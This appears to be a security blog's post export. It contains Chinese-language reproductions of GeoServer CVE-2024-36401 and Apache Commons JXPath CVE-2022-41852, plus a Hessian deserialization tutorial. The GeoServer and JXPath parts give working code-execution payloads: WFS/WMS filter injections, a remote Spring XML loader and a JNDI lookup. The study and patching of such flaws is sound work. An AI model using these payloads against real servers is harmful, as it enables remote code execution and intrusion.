Between-1.0/1.1\n```\n<wfs:GetFeature service=\"WFS\" version=\"1.0.0\"\n  xmlns:topp=\"http://www.openplans.org/topp\"\n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns:ogc=\"http://www.opengis.net/ogc\"\n  xmlns:gml=\"http://www.opengis.net/gml\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://www.opengis.net/wfs\">\n  <wfs:Query typeName=\"topp:states\">\n<ogc:Filter>\n<ogc:PropertyIsBetween>\n<ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</ogc:PropertyName>\n<ogc:LowerBoundary><ogc:Literal>100000</ogc:Literal></ogc:LowerBoundary>\n<ogc:UpperBoundary><ogc:Literal>150000</ogc:Literal></ogc:UpperBoundary>\n</ogc:PropertyIsBetween>\n</ogc:Filter>\n  </wfs:Query>\n</wfs:GetFeature> \n\nGET:\n/geoserver/wfs?request=GetFeature&version=1.1.0&typeName=topp:states&propertyName=STATE_NAME,LAND_KM,the_geom&outputFormat=GML2&FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%3E%3CPropertyIsBetween%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLowerBoundary%3E%3CLiteral%3E100000%3C%2FLiteral%3E%3C%2FLowerBoundary%3E%3CUpperBoundary%3E%3CLiteral%3E150000%3C%2FLiteral%3E%3C%2FUpperBoundary%3E%3C%2FPropertyIsBetween%3E%3C%2FFilter%3E\n```\n### Intersects-1.0/1.1\n```\nPOST:\n<wfs:GetFeature service=\"WFS\" version=\"1.0.0\"\n  xmlns:topp=\"http://www.openplans.org/topp\"\n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns=\"http://www.opengis.net/ogc\"\n  xmlns:gml=\"http://www.opengis.net/gml\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://www.opengis.net/wfs\">\n  <wfs:Query typeName=\"topp:states\">\n    <Filter>\n      <Intersects>\n        <PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</PropertyName>\n        </Intersects>\n      </Filter>\n  </wfs:Query>\n</wfs:GetFeature>\n\nGET:\n/geoserver/wfs?request=GetFeature&version=1.0.0&typeName=topp:states&FILTER=%3CFilter+xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%3E%3CIntersects%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3Cgml%3APoint+srsName%3D%22EPSG%3A4326%22%3E%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%3C%2Fgml%3APoint%3E%3C%2FIntersects%3E%3C%2FFilter%3E\n```\n### NotDisjoint\n```\nPOST:\n<wfs:GetFeature service=\"WFS\" version=\"2.0.0\"\n    xmlns:wfs=\"http://www.opengis.net/wfs/2.0\" xmlns:fes=\"http://www.opengis.net/fes/2.0\"\n    xmlns:gml=\"http://www.opengis.net/gml/3.2\" xmlns:sf=\"http://www.openplans.org/spearfish\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n    xsi:schemaLocation=\"http://www.opengis.net/wfs/2.0 http://schemas.opengis.net/wfs/2.0/wfs.xsd\n        http://www.opengis.net/gml/3.2 http://schemas.opengis.net/gml/3.2.1/gml.xsd\">\n    <wfs:Query typeNames=\"sf:bugsites\">\n        <fes:Filter>\n            <fes:Not>\n                <fes:Disjoint>\n                    <fes:ValueReference>exec(java.lang.Runtime.getRuntime(),\"calc\")</fes:ValueReference>\n                </fes:Disjoint>\n            </fes:Not>\n        </fes:Filter>\n    </wfs:Query>\n</wfs:GetFeature>\n\nGET:\n/geoserver/wfs?service=WFS&version=2.0.0&request=GetFeature&typenames=sf:bugsites&filter=%3Cfes%3AFilter+xmlns%3Afes%3D%22http%3A%2F%2Fwww.opengis.net%2Ffes%2F2.0%22+xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2F3.2%22%3E%3Cfes%3ANot%3E%3Cfes%3ADisjoint%3E%3Cfes%3AValueReference%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2Ffes%3AValueReference%3E%3Cgml%3APolygon+gml%3Aid%3D%27polygon.1%27+srsName%3D%27http%3A%2F%2Fwww.opengis.net%2Fdef%2Fcrs%2FEPSG%2F0%2F26713%27%3E%3Cgml%3Aexterior%3E%3Cgml%3ALinearRing%3E%3Cgml%3AposList%3E590431+4915204+590430+4915205+590429+4915204+590430+4915203+590431+4915204%3C%2Fgml%3AposList%3E%3C%2Fgml%3ALinearRing%3E%3C%2Fgml%3Aexterior%3E%3C%2Fgml%3APolygon%3E%3C%2Ffes%3ADisjoint%3E%3C%2Ffes%3ANot%3E%3C%2Ffes%3AFilter%3E\n```\n### Math\n```\nPOST：\n<wfs:GetFeature service=\"WFS\" version=\"1.0.0\"\n  xmlns:topp=\"http://www.openplans.org/topp\"\n  xmlns:wfs=\"http://www.opengis.net/wfs\"\n  xmlns:ogc=\"http://www.opengis.net/ogc\"\n  xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n  xsi:schemaLocation=\"http://www.opengis.net/wfs\">\n  <wfs:Query typeName=\"topp:states\">\n    <ogc:Filter>\n      <ogc:PropertyIsGreaterThan>\n        <ogc:Div>\n            <ogc:PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</ogc:PropertyName>\n            <ogc:PropertyName>xxx</ogc:PropertyName>\n        </ogc:Div>\n         <ogc:Literal>0.25</ogc:Literal>\n    </ogc:PropertyIsGreaterThan>\n    </ogc:Filter>\n    </wfs:Query>\n</wfs:GetFeature>\n\nGET：\n/geoserver/wfs?request=GetFeature&version=1.1.0&typeName=topp:states&formatName=GML2&FILTER=%3Cogc:Filter%20xmlns:ogc=%22http://www.opengis.net/ogc%22%3E%3Cogc:PropertyIsGreaterThan%3E%3Cogc:Div%3E%3Cogc:PropertyName%3EMANUAL%3C/ogc:PropertyName%3E%3Cogc:PropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C/ogc:PropertyName%3E%3C/ogc:Div%3E%3Cogc:Literal%3E0.25%3C/ogc:Literal%3E%3C/ogc:PropertyIsGreaterThan%3E%3C/ogc:Filter%3E\n```\n## WMS getMap\n\n```\nGET /geoserver/wms?version=1.3.0&bbox=24,-130,50,-66&Format=image/png&request=GetMap&width=550&height=250&crs=EPSG:4326&SLD_BODY=%3CStyledLayerDescriptor+version%3D%221.1.0%22%3E%3CUserLayer%3E%3CName%3Etopp%3Astates%3C%2FName%3E%3CUserStyle%3E%3CName%3EUserSelection%3C%2FName%3E%3CFeatureTypeStyle%3E%3CRule%3E%3CFilter%3E%3CPropertyIsEqualTo%3E%3CPropertyName%3Eexec%28java.lang.Runtime.getRuntime%28%29%2C%22calc%22%29%3C%2FPropertyName%3E%3CLiteral%3EIllinois%3C%2FLiteral%3E%3C%2FPropertyIsEqualTo%3E%3C%2FFilter%3E%3CPolygonSymbolizer%3E%3CFill%3E%3CSvgParameter+name%3D%22fill%22%3E%23FF0000%3C%2FSvgParameter%3E%3C%2FFill%3E%3C%2FPolygonSymbolizer%3E%3C%2FRule%3E%3CRule%3E%3CLineSymbolizer%3E%3CStroke%2F%3E%3C%2FLineSymbolizer%3E%3C%2FRule%3E%3C%2FFeatureTypeStyle%3E%3C%2FUserStyle%3E%3C%2FUserLayer%3E%3C%2FStyledLayerDescriptor%3E HTTP/1.1\nHost: 127.0.0.1:8085\n```\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<ogc:GetMap xmlns:ogc=\"http://www.opengis.net/ows\" \n            xmlns:gml=\"http://www.opengis.net/gml\" \n            version=\"1.2.0\"\n            service=\"WMS\">\n\n  <StyledLayerDescriptor version=\"1.0.0\" \n                         xsi:schemaLocation=\"http://www.opengis.net/sld StyledLayerDescriptor.xsd\"\n                         xmlns=\"http://www.opengis.net/sld\" \n                         xmlns:ogc=\"http://www.opengis.net/ogc\" \n                         xmlns:xlink=\"http://www.w3.org/1999/xlink\"\n                         xmlns:dave=\"http://blasby.com\" \n                         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">\n    <UserLayer>\n      <Name>Inline</Name>\n\n      <InlineFeature>\n        <FeatureCollection>\n          <featureMember>\n            <BodyPart>\n              <Type>Mouth</Type>\n              <polygonProperty>\n                <gml:Polygon>\n                  <gml:outerBoundaryIs>\n                    <gml:LinearRing>\n                      <gml:coordinates>\n                        397,226 396,209 396,196 390,185 384,175 368,163 353,155 331,150 308,149 283,148 261,153 231,163\n                        209,175 195,189 186,209 182,221 187,226 193,214 195,205 200,197 203,192 215,185 226,177 241,171\n                        256,167 266,163 281,161 297,161 321,160 341,160 359,168 371,175 382,185 388,197 390,215 390,225\n                        394,226 397,226\n                      </gml:coordinates>\n                    </gml:LinearRing>\n                  </gml:outerBoundaryIs>\n                </gml:Polygon>\n              </polygonProperty>\n            </BodyPart>\n          </featureMember>\n        </FeatureCollection>\n      </InlineFeature>\n\n      <UserStyle>\n        <FeatureTypeStyle>\n          <Rule>\n            <Filter>\n              <Or>\n                <PropertyIsEqualTo>\n                  <PropertyName>exec(java.lang.Runtime.getRuntime(),\"calc\")</PropertyName>\n                  <Literal>Eye</Literal>\n                </PropertyIsEqualTo>\n              </Or>\n            </Filter>\n            <PolygonSymbolizer>\n              <Fill>\n                <CssParameter name=\"fill\">\n                  <ogc:Literal>#DD06E0</ogc:Literal>\n                </CssParameter>\n                <CssParameter name=\"fill-opacity\">\n                  <ogc:Literal>1.0</ogc:Literal>\n                </CssParameter>\n              </Fill>\n              <Stroke>\n                <CssParameter name=\"stroke\">\n                  <ogc:Literal>#FF00FF</ogc:Literal>\n                </CssParameter>\n              </Stroke>\n            </PolygonSymbolizer>\n          </Rule>\n        </FeatureTypeStyle>\n      </UserStyle>\n    </UserLayer>\n\n  </StyledLayerDescriptor>\n\n  <BoundingBox>\n    <gml:coord>\n      <gml:X>0</gml:X>\n      <gml:Y>0</gml:Y>\n    </gml:coord>\n    <gml:coord>\n      <gml:X>500</gml:X>\n      <gml:Y>500</gml:Y>\n    </gml:coord>\n  </BoundingBox>\n\n  <Output>\n    <Format>image/jpeg</Format>\n    <Transparent>false</Transparent>\n    <Size>\n      <Width>501</Width>\n      <Height>501</Height>\n    </Size>\n  </Output>\n\n\n</ogc:GetMap>\n```\n## Reference\n\n- [https://xz.aliyun.com/t/14991](https://xz.aliyun.com/t/14991)\n- [https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/](https://y4tacker.github.io/2024/07/03/year/2024/7/%E6%B5%85%E6%9E%90GeoServer-property-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2024-36401/)\n","tags":["java安全","表达式注入","geoserver"],"categories":["cve复现"]},{"title":"Apache Commons JXPath","url":"/2024/07/08/Apache-Commons-JXPath/","content":"\n\n\n\n# Apache Commons JXPath\n\n\nApache Commons JXPath是美国阿帕奇（Apache）基金会的一种 XPath 1.0 的基于 Java 的实现。JXPath 为使用 XPath 语法遍历 JavaBeans、DOM 和其他类型的对象的图形提供了 API。\n\n依赖\n```xml\n<dependency>\n  <groupId>commons-jxpath</groupId>\n  <artifactId>commons-jxpath</artifactId>\n  <version>1.3</version>\n</dependency>\n```\n\n## CVE-2022-41852\n版本：<=1.3\nJXPath \n<img src=\"/img/24-7-8/1.png\" >\nJXPath提供一个Extension Functions 扩展功能：JXPath 开箱即用地支持标准 XPath 函数。它还支持“标准”扩展函数（基本上是 Java 的桥梁）以及完全自定义的扩展函数。\n基本是这个是漏洞的利用点，能直接调用java中相关静态方法和构造方法\n\n利用：\n1.通过调用对象的new创建一个对象\n2.能够调用静态方法\n3.或者是调用普通方法的方法(类似于invoke的用法？？)\n\n对应类：PackageFunctions\n<img src=\"/img/24-7-8/2.png\" >\n逻辑自己看代码（懒得解释了）\n\n漏洞环境：\n```java\nString s=\"org.springframework.context.support.ClassPathXmlApplicationContext.new(\\\"http://127.0.0.1:8001/test.xml\\\")\";\nJXPathContext jxPathContext = JXPathContext.newContext(null);\njxPathContext.getValue(s);\n```\ngetValue方法：\n<img src=\"/img/24-7-8/3.png\" >\n\n实际上是调用了compute方法或者是computeValue方法\n<img src=\"/img/24-7-8/4.png\" >\n\n类似的方法调用还有：iteratePointers/iterate\n<img src=\"/img/24-7-8/5.png\" >\n### 构造方法利用\nspring环境：\n\n- **ClassPathXmlApplicationContext **\n- FileSystemXmlApplicationContext\n\n**利用**：\n直接利用远程加载spring配置文件，构造任意bean并调用任意方法实现RCE\n\n\n\n\n弹计算器\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n       xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n       xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n        http://www.springframework.org/schema/beans/spring-beans.xsd\">\n\n<bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n    <constructor-arg>\n        <list>\n            <value>cmd</value>\n            <value>/c</value>\n            <value>calc</value>\n        </list>\n    </constructor-arg>\n</bean>\n</beans>\n```\n(其中class指定类名，constructor-arg构造方法参数，init-method初始bean要调用的方法)\n\n看看**ClassPathXmlApplicationContext**\n<img src=\"/img/24-7-8/6.png\" >\n然后根据xml配置文件完成bean工厂的初始化，并创建对应的bean (通过AbstractAutowireCapableBeanFactory#invokeCustomInitMethod调用相关方法)\n<img src=\"/img/24-7-8/7.png\" >\n**poc**\n**仅适用于Spring环境**\n1.开启http服务，放置对应恶意的spring配置文件，如上面的test.xml\n2.编写注入表达式：\n```java\norg.springframework.context.support.ClassPathXmlApplicationContext.new(\"http://127.0.0.1:8001/test.xml\")\n```\n### 静态方法调用的利用\n对于这种demo的利用，我们可以关注到javax.naming.InitialContext#doLookup方法\n<img src=\"/img/24-7-8/8.png\" >\njndi注入，不分析了\n一个静态方法干了两件事情，标准的能进行jndi注入\n```java\n\tString s=\"javax.naming.InitialContext.doLookup(\\\"ldap://127.0.0.1:8085/CUhddZiV\\\")\";\n\t\tJXPathContext jxPathContext = JXPathContext.newContext(null);\n\t\tjxPathContext.getValue(s);\n```\n### 普通方法调用\n根据官方逻辑：[https://commons.apache.org/proper/commons-jxpath/users-guide.html#Extension_Functions](https://commons.apache.org/proper/commons-jxpath/users-guide.html#Extension_Functions)\n```java\n JXPathContext context = JXPathContext.newContext(null);\n context.getValue(\"exec(java.lang.Runtime.getRuntime(), 'calc')\");\n```\n又或者我们利用ScriptEngineManager调用js实现rce\n```java\neval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec(\"calc\")')\n```\n### 修复\n限制lib库使用，就是禁用java相关调用\n```java\n var pathContext = JXPathContext.newContext(null);\n// Set empty function library\npathContext.setFunctions(new FunctionLibrary());\n\n// getValue will throw org.apache.commons.jxpath.JXPathFunctionNotFoundException\nreturn pathContext.getValue(path);\n```\n","tags":["java安全","apache commons","表达式注入"],"categories":["Life"]},{"title":"Hessian","url":"/2024/06/07/Hessian/","content":"\n\n\n\n# Hessian\n\n\nHessian是一个轻量级的remoting onhttp工具，是一个轻量级的Java序列化/反序列化框架，使用简单的方法提供了RMI的功能。 相比WebService，Hessian更简单、快捷。采用的是二进制RPC协议，因为采用的是二进制协议，所以它很适合于发送二进制数据。\n\nRPC协议的一次远程通信过程如下\n\n- 客户端发起请求，并按照RPC协议格式填充信息\n- 填充完毕后将二进制格式文件转化为流，通过传输协议进行传输\n- 服务端接收到流后，将其转换为二进制格式文件，并按照RPC协议格式获取请求的信息并进行处理\n- 处理完毕后将结果按照RPC协议格式写入二进制格式文件中并返回\n## 各种反序列化机制\n在网络通信过程中，我们想传输的内容肯定不止局限于文本或二进制信息，假如我们想要传递给远端一个特定的对象，那么这时就需要用到序列化和反序列化这种技术了。\n在Java中，序列化能够将一个Java对象转换为一串**便于传输**的字节序列。而反序列化与之相反，能够从字节序列中恢复出一个对象。参考[marshalsec.pdf](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)，我们可以将序列化/反序列化机制分大体分为两类\n\n- 基于Bean属性访问机制\n- 基于Field机制\n### 基于Bean属性访问机制\n\n- SnakeYAML\n- jYAML\n- YamlBeans\n- Apache Flex BlazeDS\n- Red5 IO AMF\n- Jackson\n- Castor\n- Java XMLDecoder\n- …\n\n它们最基本的区别是如何在对象上设置属性值，它们有共同点，也有自己独有的不同处理方式。有的通过反射自动调用getter(xxx)和setter(xxx)访问对象属性，有的还需要调用默认Constructor，有的处理器（指的上面列出来的那些）在反序列化对象时，如果类对象的某些方法还满足自己设定的某些要求，也会被自动调用。还有XMLDecoder这种能调用对象任意方法的处理器。有的处理器在支持多态特性时，例如某个对象的某个属性是Object、Interface、abstruct等类型，为了在反序列化时能完整恢复，需要写入具体的类型信息，这时候可以指定更多的类，在反序列化时也会自动调用具体类对象的某些方法来设置这些对象的属性值。\n这种机制的攻击面比基于Field机制的攻击面大，因为它们自动调用的方法以及在支持多态特性时自动调用方法比基于Field机制要多。\n### 基于Field机制\n基于Field机制的反序列化是通过特殊的native（方法或反射（最后也是使用了native方式）直接对Field进行赋值操作的机制，而不是通过getter、setter方式对属性赋值。\n\n- Java Serialization\n- Kryo\n- Hessian\n- json-io\n- XStream\n- …\n\n**依赖**\n```xml\n<dependency>\n  <groupId>com.caucho</groupId>\n  <artifactId>hessian</artifactId>\n  <version>4.0.63</version>\n</dependency>\n```\n\n## 基本使用\n因为 Hessian 基于 HTTP 协议，所以通常通过 Web 应用来提供服务，以下为几种常见的模式\n### Servlet项目\n通过把提供服务的类注册成 Servlet 的方式来作为 Server 端进行交互。\n实现的接口\n```java\npackage com.yyjccc.hessianserlet.hessian;\n\nimport java.util.HashMap;\n\npublic interface Greeting {\n\tString sayHello(HashMap o);\n}\n\n```\n\n编写Servlet继承HessianServlet\n```java\npackage com.yyjccc.hessianserlet.hessian;\n\nimport com.caucho.hessian.server.HessianServlet;\n\n\nimport javax.servlet.annotation.WebServlet;\nimport java.util.HashMap;\n@WebServlet(name = \"MyHessianServlet\",urlPatterns = \"/hessian\")\npublic class MyHessianServlet extends HessianServlet implements Greeting {\n\t@Override\n\tpublic String sayHello(HashMap o) {\n\t\tSystem.out.println(\"hello world\");\n\t\treturn \"hello \"+o.toString();\n\t}\n\n\n}\n\n```\n配置好web.xml\n除了将具体实现类继承自 HessianServlet 之外，还可以不继承，完全通过配置文件进行设置，将待调用的接口和类作为 HessianServlet 的初始化参数进行配置：\nweb.xml 配置如下：\n```xml\n<servlet>\n  <servlet-name>hessian</servlet-name>\n  <servlet-class>com.caucho.hessian.server.HessianServlet</servlet-class>\n  <init-param>\n    <param-name>home-class</param-name>\n    <param-value>com.yyjccc.hessianserlet.hessian.MyHessianServlet</param-value>\n  </init-param>\n  <init-param>\n    <param-name>hone-api</param-name>\n    <param-value>com.yyjccc.hessianserlet.hessian.Greeting</param-value>\n  </init-param>\n</servlet>\n<servlet-mapping>\n  <servlet-name>hessian</servlet-name>\n  <url-pattern>/hessian</url-pattern>\n</servlet-mapping>\n```\n编写客户端远程调用，Client 端通过 com.caucho.hessian.client.HessianProxyFactory 工厂类创建对接口的代理对象，并进行调用，可以看到调用后执行了服务端的逻辑并返回了代码。\n```java\npackage com.yyjccc.hessianserlet.hessian;\n\nimport com.caucho.hessian.client.HessianProxyFactory;\n\nimport java.net.MalformedURLException;\nimport java.util.HashMap;\n\npublic class Client {\n\tpublic static void main(String[] args) throws MalformedURLException {\n\t\tString url=\"http://localhost:7878/hessian\";\n\t\tHessianProxyFactory factory=new HessianProxyFactory();\n\t\tGreeting greeting= (Greeting) factory.create(Greeting.class,url);\n\t\tHashMap<Object, Object> hashMap = new HashMap<>();\n\t\thashMap.put(\"a\",\"a\");\n\t\tSystem.out.println(\"Hessian Call: \"+greeting.sayHello(hashMap));\n\t}\n}\n\n```\n运行结果：\n<img src=\"/img/24-6-7/1.png\" >\n### Spring项目\nSpring-web 包内提供了 org.springframework.remoting.caucho.HessianServiceExporter 用来暴露远程调用的接口和实现类。使用该类 export 的 Hessian Service 可以被任何 Hessian Client 访问，因为 Spring 中间没有进行任何特殊处理。\n从 spring-web-5.3 后，该类被标记为 @Deprecated ， 也就是说 spring 在逐渐淘汰对基于序列化的远程调用的相关支持。\n<img src=\"/img/24-6-7/2.png\" >\n将服务实现类注入到spring中，\n然后编写配置类\n```java\npackage com.yyjcccc.hessianser.spring;\n\nimport com.yyjcccc.hessianser.servlet.Greeting;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.remoting.caucho.HessianServiceExporter;\n\n@Configuration\npublic class HessianConfigure {\n    @Autowired\n    private Greeting greeting;\n\n    @Bean(name = \"/hessian\")\n    public HessianServiceExporter config(){\n        HessianServiceExporter serviceExporter = new HessianServiceExporter();\n        serviceExporter.setService(greeting);\n        serviceExporter.setServiceInterface(Greeting.class);\n        return serviceExporter;\n    }\n}\n\n```\n\n## Hessian反序列化\n### 使用\n看看Hessian反序列化的效果\nPerson实体类\n```java\npackage com.yyjcccc.hessianser.usage;\n\nimport java.io.Serializable;\n\npublic class Person implements Serializable {\n\tpublic String name;\n\tpublic int age;\n\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n}\n```\n反序列化测试\n```java\npackage com.yyjcccc.hessianser.usage;\n\nimport com.caucho.hessian.io.HessianInput;\nimport com.caucho.hessian.io.HessianOutput;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.Serializable;\n\npublic class Hessian_Test implements Serializable {\n\n\tpublic static <T> byte[] serialize(T o) throws IOException {\n\t\tByteArrayOutputStream bao = new ByteArrayOutputStream();\n\t\tHessianOutput output = new HessianOutput(bao);\n\t\toutput.writeObject(o);\n\t\tSystem.out.println(bao.toString());\n\t\treturn bao.toByteArray();\n\t}\n\n\tpublic static <T> T deserialize(byte[] bytes) throws IOException {\n\t\tByteArrayInputStream bai = new ByteArrayInputStream(bytes);\n\t\tHessianInput input = new HessianInput(bai);\n\t\tObject o = input.readObject();\n\t\treturn (T) o;\n\t}\n\n\tpublic static void main(String[] args) throws IOException {\n\t\tPerson person = new Person();\n\t\tperson.setAge(18);\n\t\tperson.setName(\"Feng\");\n\n\t\tbyte[] s = serialize(person);\n\t\tSystem.out.println((Person) deserialize(s));\n\t}\n\n}\n\n```\n运行看看效果\n<img src=\"/img/24-6-7/3.png\" >\n对比一下原生反序列化\n```java\nimport java.io.*;\n \npublic class Ser_Test implements Serializable {\n \n    public static <T> byte[] serialize(T t) throws IOException {\n        ByteArrayOutputStream bao = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(bao);\n        oos.writeObject(t);\n        System.out.println(bao.toString());\n        return bao.toByteArray();\n    }\n \n    public static <T> T deserialize(byte[] bytes) throws IOException, ClassNotFoundException {\n        ByteArrayInputStream bai = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois  =new ObjectInputStream(bai);\n        return (T) ois.readObject();\n    }\n \n    public static void main(String[] args) throws IOException, ClassNotFoundException {\n        Person person = new Person();\n        person.setAge(18);\n        person.setName(\"Feng\");\n \n        byte[] s=serialize(person);\n        System.out.println((Person) deserialize(s));\n    }\n}\n```\n<img src=\"/img/24-6-7/4.png\" >\n### 源码分析\n在 Servlet 中采用继承或配置的时候，都是 com.caucho.hessian.server.HessianServlet 类在起作用，这个类是一个 javax.servlet.http.HttpServlet 的子类。这说明这个类的 init 方法将会承担一些初始化的功能，而 service 方法将会是相关处理的起始位置。\n接下来重点关注这两个方法。首先是 init 方法，这个方法总体来讲就是用来初始化 HessianServlet 的成员变量，包括 _homeAPI(调用类的接口 Class)、_homeImpl(具体实现类的对象)、_serializerFactory(序列化工厂类)、_homeSkeleton(封装方法)等等。\n<img src=\"/img/24-6-7/5.png\" >\n接下来看下 service 方法，\n<img src=\"/img/24-6-7/6.png\" >\ninvoke 方法根据 objectID 是否为空决定调用哪个。\n<img src=\"/img/24-6-7/7.png\" >\n接下来就进入 com.caucho.hessian.server.HessianSkeleton 的调用流程，先来简单了解一下这个类。HessianSkeleton 是 AbstractSkeleton 的子类，用来对 Hessian 提供的服务进行封装。\n首先 AbstractSkeleton 初始化时接收调用接口的类型，并按照自己的逻辑把接口中的方法保存在 _methodMap 中，包括“方法名”、“方法名__方法参数个数”、“方法名_参数类型_参数2类型”等自定义格式。\n<img src=\"/img/24-6-7/8.png\" >\nHessianSkeleton 初始化时将实现类保存在成员变量 _service 中。\n<img src=\"/img/24-6-7/9.png\" >\nHessianSkeleton 中还有两个成员变量，HessianFactory 用来创建 HessianInput/HessianOutput 流，HessianInputFactory 用来读取和创建 HessianInput/Hessian2Input 流，用到的时候会细说。\n<img src=\"/img/24-6-7/10.png\" >\n简单了解了之后，来看下调用中的关键方法 HessianSkeleton#invoke ，首先是输入输出流的创建。\n<img src=\"/img/24-6-7/11.png\" >\n然后主要是调用方法的查找和参数的反序列化，反序列化后进行反射调用，并写回结果。\n<img src=\"/img/24-6-7/12.png\" >\n接下来说下 **Spring**。\n在 Spring 中的关键类是 org.springframework.remoting.caucho.HessianExporter，关键方法是 doInvoke 方法，其实逻辑与 Servlet 类似，就不多重复了。\n<img src=\"/img/24-6-7/13.png\" >\n可以看到这里也是额外处理了一下类加载器的问题。\n### 远程调用\n在远程调用时，我们的代码如下：\n```java\nString url = \"http://localhost:8080/hessian\";\nHessianProxyFactory factory  = new HessianProxyFactory();\nGreeting            greeting = (Greeting) factory.create(Greeting.class, url);\nHashMap map = new HashMap<String,String>();\nmap.put(\"a\",\"d\");\nSystem.out.println(\"Hello: \" + greeting.sayHello(map));\n```\n可以看到，这里创建了 HessianProxyFactory 实例，并调用其 create 方法，这里实际上是使用了 Hessian 提供的 HessianProxy 来为待调用的接口和 HessianRemoteObject 创建动态代理类。\n<img src=\"/img/24-6-7/14.png\" >\n 我们知道动态代理对象无论调用什么方法都会走 InvocationHandler 的 invoke 方法。\n<img src=\"/img/24-6-7/15.png\" >\n发送请求获取结果并反序列化，这里使用了 HessianURLConnection 来建立连接。\n<img src=\"/img/24-6-7/16.png\" >\n非常简单的逻辑，就是发出了一个 HTTP 请求并反序列化数据而已。\n\n建立连接发送post请求，设置版本信息加上调用方法名\n<img src=\"/img/24-6-7/17.png\" >\n### 序列化与反序列化流程\nHessian 的序列化反序列化流程有几个关键类，一般包括输入输出流、序列化/反序列化器、相关工厂类等等，依次来看一下。\n首先是输入和输出流，Hessian 定义了 AbstractHessianInput/AbstractHessianOutput 两个抽象类，用来提供序列化数据的读取和写入功能。Hessian/Hessian2/Burlap 都有这两个类各自的实现类来实现具体的逻辑。\n先来看**序列化**，对于输出流关键类为 AbstractHessianOutput 的相关子类，这些类都提供了 call 等相关方法执行方法调用，writeXX 方法进行序列化数据的写入，这里以 Hessian2Output 为例。\n除了基础数据类型，主要关注的是对 Object 类型数据的写入方法 writeObject：\n<img src=\"/img/24-6-7/18.png\" >\n这个方法根据指定的类型获取序列化器 Serializer 的实现类，并调用其 writeObject 方法序列化数据。在当前版本中，可看到一共有 29 个子类针对各种类型的数据。对于自定义类型，将会使用 JavaSerializer/UnsafeSerializer/JavaUnsharedSerializer 进行相关的序列化动作，默认情况下是 UnsafeSerializer。\n<img src=\"/img/24-6-7/19.png\" >\nUnsafeSerializer#writeObject 方法兼容了 Hessian/Hessian2 两种协议的数据结构，会调用 writeObjectBegin 方法开始写入数据，\n<img src=\"/img/24-6-7/20.png\" >\nwriteObjectBegin 这个方法是 AbstractHessianOutput 的方法，Hessian2Output 重写了这个方法，而其他实现类没有。也就是说在 Hessian 1.0 和 Burlap 中，写入自定义数据类型（Object）时，都会调用 writeMapBegin 方法将其标记为 Map 类型。\n<img src=\"/img/24-6-7/21.png\" >\n在 Hessian 2.0 中，将会调用 writeDefinition20 和 Hessian2Output#writeObjectBegin 方法写入自定义数据，就不再将其标记为 Map 类型。\n再看**反序列化**，对于输入流关键类为 AbstractHessianInput 的子类，这些类中的 readObject 方法定义了反序列化的关键逻辑。基本都是长达 200 行以上的 switch case 语句。在读取标识位后根据不同的数据类型调用相关的处理逻辑。这里还是以 Hessian2Input 为例。\n<img src=\"/img/24-6-7/22.png\" >\n与序列化过程设计类似，Hessian 定义了 Deserializer 接口，并为不同的类型创建了不同的实现类。这里重点看下对自定义类型对象的读取。\n在 Hessian 1.0 的 HessianInput 中，没有针对 Object 的读取，而是都将其作为 Map 读取，在序列化的过程中我们也提到，在写入自定义类型时会将其标记为 Map 类型。\n<img src=\"/img/24-6-7/23.png\" >\nMapDeserializer#readMap 方法提供了针对 Map 类型数据的处理逻辑。\n<img src=\"/img/24-6-7/24.png\" >\n在 Hessian 2.0 中，则是提供了 UnsafeDeserializer 